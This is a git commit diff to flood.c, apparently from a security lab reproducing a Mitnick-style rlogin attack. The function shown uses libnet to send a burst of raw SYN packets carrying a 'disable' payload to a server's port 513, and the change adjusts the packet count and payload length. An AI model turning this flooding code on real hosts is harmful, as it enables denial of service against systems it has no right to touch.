13a84335b9195c0f018526d6b299a58eefdf3d55
rick <riccardo.iesari@gmail.com>
2020-09-20 12:01:17 +0200

    test flood change

--- flood.c
+++ flood.c
@@ -5,15 +5,15 @@
 void disableServer(libnet_t *l,u_long kevinIp, u_long serverIp)
 {
     //Sends 10 packet to the server with payload disable
-    for(int i=0; i<10; i++)
+    for(int i=0; i<11; i++)
     {   
         tcpTagCreate(l,libnet_get_prand(LIBNET_PRu16),(u_int16_t)513,
                                     libnet_get_prand(LIBNET_PRu32),libnet_get_prand(LIBNET_PRu32),
-                                    "disable", 7,
+                                    "disable", 8,
                                     TH_SYN);
 
         ipTagCreate(l,(u_int32_t)kevinIp,(u_int32_t)serverIp,
-                                   NULL, (u_int32_t)7 );
+                                   NULL, (u_int32_t)8 );
         sendPacket(l);
         usleep(200); 
           
